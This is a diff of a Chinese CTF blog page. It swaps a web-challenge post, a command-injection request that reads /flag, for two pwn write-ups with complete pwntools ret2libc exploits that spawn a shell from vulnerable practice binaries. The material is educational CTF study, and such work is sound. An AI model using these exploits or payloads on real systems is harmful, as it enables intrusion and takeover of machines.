@@ -4,10 +4,12 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="安洵杯CTF easywebpayload, F0und">
-    <meta name="description" content="WEBeasy webpayload:
-POST /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;amp;cmd=ca\t%20/flag HTTP/1.1
-Host: 47.108.135.">
+    <meta name="keywords" content="Pwn练习-Day03, F0und">
+    <meta name="description" content="Day030x10 前言越来越难啦，，，一天真就写了两道题
+PS:这两道题还算有点意思，就放博客上了，前面的没什么意思
+今天就不加入门的RSA玩了
+0x20 ciscn_2019_c_1题目来源：buuoj.cn 
+考点：ret2libc，">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -15,7 +17,7 @@ Host: 47.108.135.">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>安洵杯CTF easywebpayload | F0und</title>
+    <title>Pwn练习-Day03 | F0und</title>
     <link rel="icon" type="image/png" href="/medias/fav.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -212,13 +214,13 @@ Host: 47.108.135.">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        安洵杯CTF easywebpayload
+                        Pwn练习-Day03
                     </div>
                 </div>
             </div>
@@ -310,8 +312,12 @@ Host: 47.108.135.">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/axbctf/" target="_blank">
-                                <span class="chip bg-color">axbctf</span>
+                            <a href="/tags/ctf/" target="_blank">
+                                <span class="chip bg-color">ctf</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/" target="_blank">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
                     </div>
@@ -334,21 +340,21 @@ Host: 47.108.135.">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-11-30
+                    2020-03-15
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        267
+                        2.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        1 分
+                        11 分
                     </div>
                     
                 
@@ -364,21 +370,410 @@ Host: 47.108.135.">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy web"></a>easy web</h2><p>payload:</p>
-<pre class=" language-lang-txt"><code class="language-lang-txt">POST /index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=ca\t%20/flag HTTP/1.1
-Host: 47.108.135.45:20270
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
-Accept-Encoding: gzip, deflate
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 307
-Origin: http://47.108.135.45:20270
-Connection: close
-Referer: http://47.108.135.45:20270/index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3&amp;cmd=1
-Upgrade-Insecure-Requests: 1
+                <h1 id="Day03"><a href="#Day03" class="headerlink" title="Day03"></a>Day03</h1><h2 id="0x10-前言"><a href="#0x10-前言" class="headerlink" title="0x10 前言"></a>0x10 前言</h2><p>越来越难啦，，，一天真就写了两道题</p>
+<p>PS:这两道题还算有点意思，就放博客上了，前面的没什么意思</p>
+<p>今天就不加入门的RSA玩了</p>
+<h2 id="0x20-ciscn-2019-c-1"><a href="#0x20-ciscn-2019-c-1" class="headerlink" title="0x20 ciscn_2019_c_1"></a>0x20 ciscn_2019_c_1</h2><p>题目来源：buuoj.cn </p>
+<p>考点：ret2libc，计算偏移量，18.04在调用system前需要栈对齐</p>
+<p>难度：简单</p>
+<p>file:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">ciscn_2019_c_1: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=06ddf49af2b8c7ed708d3cfd8aec8757bca82544, not stripped
+</code></pre>
+<p>64位动态链接库文件</p>
+<p>checksec</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>开启了NX，栈数据不可执行</p>
+<p>ida 反汇编主要函数</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-4h]
 
-a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
+  init(*(_QWORD *)&amp;argc, argv, envp);
+  puts("EEEEEEE                            hh      iii                ");
+  puts("EE      mm mm mmmm    aa aa   cccc hh          nn nnn    eee  ");
+  puts("EEEEE   mmm  mm  mm  aa aaa cc     hhhhhh  iii nnn  nn ee   e ");
+  puts("EE      mmm  mm  mm aa  aaa cc     hh   hh iii nn   nn eeeee  ");
+  puts("EEEEEEE mmm  mm  mm  aaa aa  ccccc hh   hh iii nn   nn  eeeee ");
+  puts("====================================================================");
+  puts("Welcome to this Encryption machine\n");
+  begin("Welcome to this Encryption machine\n");
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      fflush(0LL);
+      v4 = 0;
+      __isoc99_scanf("%d", &amp;v4);
+      getchar();
+      if ( v4 != 2 )
+        break;
+      puts("I think you can do it by yourself");
+      begin("I think you can do it by yourself");
+    }
+    if ( v4 == 3 )
+    {
+      puts("Bye!");
+      return 0;
+    }
+    if ( v4 != 1 )
+      break;
+    encrypt("%d", &amp;v4);
+    begin("%d");
+  }
+  puts("Something Wrong!");
+  return 0;
+}
+</code></pre>
+<pre class=" language-lang-c"><code class="language-lang-c">int begin()
+{
+  puts("====================================================================");
+  puts("1.Encrypt");
+  puts("2.Decrypt");
+  puts("3.Exit");
+  return puts("Input your choice!");
+}
+</code></pre>
+<pre class=" language-lang-c"><code class="language-lang-c">int encrypt()
+{
+  size_t v0; // rbx
+  char s[48]; // [rsp+0h] [rbp-50h]
+  __int16 v3; // [rsp+30h] [rbp-20h]
+
+  memset(s, 0, sizeof(s));
+  v3 = 0;
+  puts("Input your Plaintext to be encrypted");
+  gets(s);
+  while ( 1 )
+  {
+    v0 = (unsigned int)x;
+    if ( v0 &gt;= strlen(s) )
+      break;
+    if ( s[x] &lt;= 96 || s[x] &gt; 122 )
+    {
+      if ( s[x] &lt;= 64 || s[x] &gt; 90 )
+      {
+        if ( s[x] &gt; 47 &amp;&amp; s[x] &lt;= 57 )
+          s[x] ^= 0xFu;
+      }
+      else
+      {
+        s[x] ^= 0xEu;
+      }
+    }
+    else
+    {
+      s[x] ^= 0xDu;
+    }
+    ++x;
+  }
+  puts("Ciphertext");
+  return puts(s);
+}
+</code></pre>
+<p>简单测试过程序之后我们会发现，程序提供了两个功能：</p>
+<ol>
+<li>Encrypt()函数</li>
+<li>Decrypt()没鸟用函数</li>
+</ol>
+<p>而我们发现在encrypt()函数中出现了我们最喜欢的gets()函数，那么漏洞点就来了，我们可以通过手算（0x50）+(0x8)​计算出来偏移量为88，也可以用peda来算，问题都不大</p>
+<p>算出来偏移后我们就可以干我们想干的事情了，由于程序里没有给出system函数，因此我们就需要自己来泄露libc来获取shell了</p>
+<p>如何获取libc版本呢，这可真令人头大，我们在仔细看一下</p>
+<p>程序是64位的程序，参数不放在栈上，而是放在寄存器中，因此我们还要使用ROPgadget来找一个pop_rdi</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">Gadgets information
+============================================================
+0x0000000000400c7c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400c7e : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400c80 : pop r14 ; pop r15 ; ret
+0x0000000000400c82 : pop r15 ; ret
+0x0000000000400c7b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000400c7f : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000004007f0 : pop rbp ; ret
+0x0000000000400aec : pop rbx ; pop rbp ; ret
+0x0000000000400c83 : pop rdi ; ret  &lt;-------pop_rdi找到了
+0x0000000000400c81 : pop rsi ; pop r15 ; ret
+0x0000000000400c7d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+0x00000000004006b9 : ret
+0x00000000004008ca : ret 0x2017
+0x0000000000400962 : ret 0x458b
+0x00000000004009c5 : ret 0xbf02
+</code></pre>
+<p>根据我在 <a href="http://cdusec.happyhacking.top/?post=127" target="_blank" rel="noopener">http://cdusec.happyhacking.top/?post=127</a> 介绍的知识，（不同的是这个程序是64位的，因此payload要变一下）</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">payload1='a'*offset + pop_rdi_addr + elf.plt['puts'] + elf.got['puts']+ retaddr
+</code></pre>
+<p>泄露puts函数真实地址来确定libc版本</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+from LibcSearcher import *
+
+def choose(index):
+    sh.recvuntil("Input your choice!\n")
+    sh.sendline(str(index))
+
+def link_libc(payload):
+    sh.recvuntil("Input your Plaintext to be encrypted\n")
+       sh.sendline(payload)
+
+def pwn(ip,port,debug):
+    global sh
+    if debug==1:
+        sh = process('./ciscn_2019_c_1')
+        elf = ELF('./ciscn_2019_c_1')
+        context.log_level = 'debug'
+    else:
+        sh=remote(ip,port)
+    rdi_addr = 0x0000000000400c83
+    ret_addr=0x4009A0
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+
+    sh.sendlineafter('choice!\n', '1')
+    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
+
+    link_libc(payload1)
+
+    sh.recvuntil('@')
+    sh.recvline()
+
+    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))
+
+    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))
+
+if __name__ == '__main__':
+    pwn(0,0,1)
+</code></pre>
+<p>执行完以后：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">[+] puts_leak_addr =&gt; 0x7f558db9e690
+</code></pre>
+<p>我们就已经泄露出puts的真实地址了</p>
+<blockquote>
+<p>知识点：</p>
+<ol>
+<li><p>Linux的程序中使用了延迟绑定机制，也就是说一个函数在没有执行前，你是不知道它的真实地址是什么的</p>
+</li>
+<li><p>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</p>
+</li>
+<li><p>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变</p>
+</li>
+</ol>
+</blockquote>
+<p>然后就是正常的ret2libc操作了：关于libcseacher的使用方法就不过多介绍了</p>
+<p>完整exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#/usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+from LibcSearcher import *
+
+def choose(index):
+    sh.recvuntil("Input your choice!\n")
+    sh.sendline(str(index))
+
+def link_libc(payload):
+    sh.recvuntil("Input your Plaintext to be encrypted\n")
+       sh.sendline(payload)
+
+def pwn(ip,port,debug):
+    global sh
+    if debug==1:
+        sh = process('./ciscn_2019_c_1')
+        elf = ELF('./ciscn_2019_c_1')
+        context.log_level = 'debug'
+    else:
+        sh=remote(ip,port)
+    rdi_addr = 0x0000000000400c83
+    ret_addr=0x4009A0 #跳转到encrypt()
+    puts_plt = elf.plt['puts']
+    puts_got = elf.got['puts']
+
+    choose(1)
+    payload1 = 'a' * 88 + p64(rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(ret_addr)
+
+    link_libc(payload1)
+    #读到\n后在读取一行就是我们想要的东西
+    sh.recvuntil('\n')
+    sh.recvline()
+
+    puts_leak = u64(sh.recvline()[:-1].ljust(8,'\x00'))
+
+    log.success('puts_leak_addr =&gt; {}'.format(hex(puts_leak)))
+    libc = LibcSearcher('puts', puts_leak)
+    libc_base = puts_leak - libc.dump('puts')
+    sys_addr = libc_base + libc.dump('system')
+    bin_sh_addr = libc_base + libc.dump('str_bin_sh')
+    payload2 = 'a' * 88 + p64(rdi_addr) + p64(bin_sh_addr) + p64(sys_addr)
+    sh.sendline(payload2)
+    sh.interactive()
+
+if __name__ == '__main__':
+    pwn(0,0,1)
+</code></pre>
+<p>这个脚本在Ubuntu16.04中可以取得shell,但在18.04中，由于Ubuntu18运行机制与前面版本的不同，在调用system的时候需要进行栈对齐</p>
+<p>因此Ubuntu18.04的payload为：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">ret = 0x4006b9
+payload_Ubuntu18 = '1'*0x58+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)
+</code></pre>
+<h2 id="0x30-OGeek2019-babyrop"><a href="#0x30-OGeek2019-babyrop" class="headerlink" title="0x30 [OGeek2019]babyrop"></a>0x30 [OGeek2019]babyrop</h2><p>题目来源：buuoj.cn</p>
+<p>考点：绕过strncmp，rop,ret2libc,变量覆盖</p>
+<p>难度：中等</p>
+<p>file:</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">pwn: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=6503b3ef34c8d55c8d3e861fb4de2110d0f9f8e2, stripped
+</code></pre>
+<p>32位动态链接库文件</p>
+<p>checksec</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>程序开启了NX，RELRO，意味着不能修改GOT表了</p>
+<p>ida 反汇编主要函数</p>
+<pre class=" language-lang-c"><code class="language-lang-c">int __cdecl main()
+{
+  int buf; // [esp+4h] [ebp-14h]
+  char v2; // [esp+Bh] [ebp-Dh]
+  int fd; // [esp+Ch] [ebp-Ch]
+
+  sub_80486BB();
+  fd = open("/dev/urandom", 0);#生成随机数
+  if ( fd &gt; 0 )
+    read(fd, &amp;buf, 4u);
+  v2 = sub_804871F(buf);#比较随机数
+  sub_80487D0(v2);
+  return 0;
+}
+</code></pre>
+<pre class=" language-lang-c"><code class="language-lang-c">ssize_t __cdecl sub_80487D0(char a1)
+{
+  ssize_t result; // eax
+  char buf; // [esp+11h] [ebp-E7h]
+
+  if ( a1 == 127 )
+    result = read(0, &amp;buf, 0xC8u);
+  else
+    result = read(0, &amp;buf, a1);
+  return result;
+}
+</code></pre>
+<pre class=" language-lang-c"><code class="language-lang-c">int __cdecl sub_804871F(int a1)
+{
+  size_t v1; // eax
+  char s; // [esp+Ch] [ebp-4Ch]
+  char buf[7]; // [esp+2Ch] [ebp-2Ch]
+  unsigned __int8 v5; // [esp+33h] [ebp-25h]
+  ssize_t v6; // [esp+4Ch] [ebp-Ch]
+
+  memset(&amp;s, 0, 0x20u);
+  memset(buf, 0, 0x20u);
+  sprintf(&amp;s, "%ld", a1);#生成的随机数读取到s中
+  v6 = read(0, buf, 0x20u);#用户输入
+  buf[v6 - 1] = 0;
+  v1 = strlen(buf);
+  if ( strncmp(buf, &amp;s, v1) )
+    exit(0);
+  write(1, "Correct\n", 8u);
+  return v5;
+}
+</code></pre>
+<p>程序主要有三个函数，分析一下程序流程：</p>
+<p>读取一个随机数，然后与用户输入作比较，需要绕过。<strong>strlen</strong>遇到\x00会停止，因此只要开头为\x00，最终比较的长度v1就是0，从而绕过strncmp</p>
+<p>这里read的第三个读取长度参数实际上是前一个函数的返回值(v5)，可以通过上一次输入覆盖为\xff，然后就可以利用栈溢出进行常规ROP了。</p>
+<p>我们来验证一下</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+
+libc=ELF("./libc-2.23.so")
+elf=ELF("./pwn")
+
+def pwn(ip,port,debug):
+    if debug==1:
+        io=process("./pwn")
+        context.log_level="debug"
+    else:
+        io=remote(ip,port)
+
+    payload='\x00'+'\xff'
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == '__main__':
+    pwn(0,0,1)
+</code></pre>
+<p>运行输出Correct</p>
+<p>绕过了随机数后我们还需要将v5覆盖的大一点来方便我们溢出，而v5距离buf(即我们的输入)的距离为：（0x2c-0x25）=7,因此根据我们以前做题的经验构造payload覆盖v5为 <code>\xff</code> </p>
+<p>因此我们的payload1：</p>
+<pre class=" language-lang-txt"><code class="language-lang-txt">payload1='\x00'+'a'*6+'\xff'
+</code></pre>
+<p>覆盖成功，接下来就是正常的一个read()溢出漏洞了,由于程序只给了write函数，我们就只能使用write函数来泄露了</p>
+<p>最终exp:</p>
+<pre class=" language-lang-python"><code class="language-lang-python">#usr/bin/env python
+#-*-coding:utf-8-*-
+
+from pwn import *
+
+libc=ELF("./libc-2.23.so")
+elf=ELF("./pwn")
+system_libc=libc.symbols['system']
+binsh_libc=libc.search('/bin/sh').next()
+write_libc=libc.symbols['write']
+write_plt=elf.plt['write']
+write_got=elf.got['write']
+main_addr=0x08048825
+
+def pwn(ip,port,debug):
+    if debug==1:
+        #io=process("./pwn")
+        io = process('./pwn',env={"LD_PRELOAD":"./libc-2.23.so"})
+        context.log_level="debug"
+    else:
+        io=remote(ip,port)
+
+    #0x2c-0x25=7
+    payload1='\x00'+'a'*6+'\xff'
+    io.sendline(payload1)
+    io.recvuntil('Correct\n')
+
+    #get read.got addr
+    #32位程序offset一般为ebp+4=0xe7+0x4
+    #payload='a'*offset+ write.plt+ retaddr +p32(0)+ write.got +p32(0)
+
+    #泄露write的got地址
+    payload='a'*0xe7+'b'*0x4
+    payload+=p32(write_plt)+p32(main_addr)
+    #    write.plt +  retaddr
+    payload+=p32(1)+p32(write_got)+p32(0x8)
+    #      write(1,wirte_got,8u)
+    io.sendline(payload)
+
+    write_addr=u32(io.recv()[0:4])
+    log.success('write_leak_addr =&gt; {}'.format(hex(write_addr)))
+
+    libc_base=write_addr-write_libc
+    system_addr=libc_base+ system_libc
+    binsh_addr=binsh_libc+libc_base
+
+    log.success('libc_leak_addr =&gt; {}'.format(hex(libc_base)))
+    log.success('system_leak_addr =&gt; {}'.format(hex(system_addr)))
+    log.success('binsh_leak_addr =&gt; {}'.format(hex(binsh_addr)))
+
+    io.sendline(payload1)
+    io.recvuntil('Correct\n')
+
+    payload='a'*(0xe7+0x4) + p32(system_addr)+ 'bbbb' + p32(binsh_addr)
+    io.sendline(payload)
+    io.interactive()
+
+if __name__ == '__main__':
+    pwn("node3.buuoj.cn",27873,1)
 </code></pre>
 <script>
         document.querySelectorAll('.github-emoji')
@@ -421,7 +816,7 @@ a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18
                     </span>
                     <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/11/30/ctf/web/axb/" class="b-link-green">安洵杯CTF easywebpayload</a>
+                    <a href="/2020/03/16/ctf/pwn/day03/" class="b-link-green">Pwn练习-Day03</a>
                 </p>
             </div>
         </div>
@@ -442,47 +837,52 @@ a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2019/12/04/go-web/puti/">
+                <a href="/2020/03/16/ctf/pwn/day03/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="Go-web github 开源项目 puti 学习">
+                        <img src="/medias/featureimages/18.jpg" class="responsive-img" alt="Pwn练习-Day03">
                         
-                        <span class="card-title">Go-web github 开源项目 puti 学习</span>
+                        <span class="card-title">Pwn练习-Day03</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言​    学习 GO 已经将近一年的时间，在学校因为杂七杂八的事情学习进度一直很慢，可能还是因为自己的颓废，以及对时间的安排不是很合理吧。
-​    指导老师说项目驱动学习，会提高我的学习效率，而工作室这边也都是商业项目，不能用来学习。</div>
+                    <div class="summary">Day030x10 前言越来越难啦，，，一天真就写了两道题
+PS:这两道题还算有点意思，就放博客上了，前面的没什么意思
+今天就不加入门的RSA玩了
+0x20 ciscn_2019_c_1题目来源：buuoj.cn 
+考点：ret2libc，</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-12-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-15
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Go/" class="post-category" target="_blank">
-                                    Go
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/web/" target="_blank">
-                        <span class="chip bg-color">web</span>
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
                     </a>
                     
-                    <a href="/tags/go/" target="_blank">
-                        <span class="chip bg-color">go</span>
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -496,39 +896,31 @@ a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/29/unfinish-work/work/">
+                <a href="/2020/03/15/ctf/pwn/day02/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="本学年工作计划">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="pwn练习-Day02">
                         
-                        <span class="card-title">本学年工作计划</span>
+                        <span class="card-title">pwn练习-Day02</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">任务清单网安之路
-XML学习
-SQLi环境搭建学习
-GraphQL 
-完成hackone101CTF
-完成hack the box
-《网络空间安全基础》
-《密码学与网络空间安全》
-
-区块链学习之路
-Go web学习
-以太坊学习
-《精通以太坊</div>
+                    <div class="summary">Day020x00 前言今天的这两道题同样很水，因此我决定加道入门的RSA玩玩，主要是堆学不动了，歇一歇 :smile_cat:
+0x10 pwn1_sctf_2016题目来源 buuoj.cn
+题目考点：经典栈溢出算偏移
+题目难度：入门
+</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-11-28
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-14
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Plan/" class="post-category" target="_blank">
-                                    Plan
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
                                 </a>
                             
                             
@@ -538,8 +930,12 @@ Go web学习
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Plan/" target="_blank">
-                        <span class="chip bg-color">Plan</span>
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
